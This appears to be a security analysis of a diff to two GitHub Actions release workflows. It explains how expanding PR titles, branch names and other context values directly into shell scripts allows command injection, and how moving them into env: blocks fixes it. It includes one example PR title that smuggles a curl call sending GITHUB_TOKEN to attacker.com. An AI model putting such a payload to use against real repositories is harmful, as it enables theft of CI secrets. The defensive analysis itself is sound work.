## Analysis

Both files are GitHub Actions workflow YAML files. The diff across both files shows a consistent, deliberate change pattern:

### The Pattern

**Before (vulnerable):** GitHub Actions context expressions are interpolated directly into shell scripts using `${{ }}` syntax within `run:` blocks.

Examples from file_01 (Release Please):
- `echo '${{ toJSON(steps.release.outputs) }}' | jq ...`
- `PR_TITLE="${{ github.event.pull_request.title }}"`
- `echo "Version: ${{ steps.plugin_info.outputs.version }}"`
- `COMPONENTS="${{ needs.release-please.outputs.components }}"`
- `--username "${{ secrets.SVN_USERNAME }}"`

Examples from file_02 (Update Release PR):
- `PR_TITLE="${{ github.event.pull_request.title }}"`
- `BRANCH_NAME="${{ github.head_ref }}"`
- `VERSION="${{ steps.version_info.outputs.version }}"`
- `node scripts/update-version-constants.js --version=$VALUE`

**After (fixed):** All context expressions are moved to `env:` blocks, and the shell scripts reference environment variables instead.

### Why This Is a Security Vulnerability

This is a **GitHub Actions script injection** vulnerability. When `${{ }}` expressions are interpolated directly into shell scripts, GitHub Actions expands them **before** the shell sees the script. If the value contains shell metacharacters (like `$(...)`, backticks, `;`, `|`, etc.), they become part of the shell command itself.

The most critical instance is in **file_02**, where `${{ github.event.pull_request.title }}` is attacker-controllable. Anyone who creates a PR can set a malicious title such as:

```
chore(main): release wp-graphql $(curl http://attacker.com/steal?t=${{ secrets.GITHUB_TOKEN }})
```

When `PR_TITLE="${{ github.event.pull_request.title }}"` expands, the embedded `$(...)` executes as a command, exfiltrating secrets.

Similarly, `${{ github.head_ref }}` (branch name) is attacker-controllable, and `${{ github.event.inputs.redeploy_tag }}` (workflow_dispatch input) is user-supplied.

All other interpolations of step outputs, matrix values, and derived values (version, component) are defense-in-depth fixes — even if data flows through step outputs, fixing all instances eliminates the pattern entirely.

The fix uses GitHub Actions' `env:` mechanism, which passes values as proper environment variables, preventing shell interpretation of their contents. This is the recommended secure pattern.

### CWE Classification

- **CWE-77: Command Injection** — Most specific and accurate. Untrusted data (PR title, branch name, user inputs) containing shell metacharacters is injected directly into shell command contexts, allowing arbitrary command execution.
- **CWE-94: Code Injection** — Also applies at a broader level, as the injection happens during the generation of shell script code that GitHub Actions assembles.
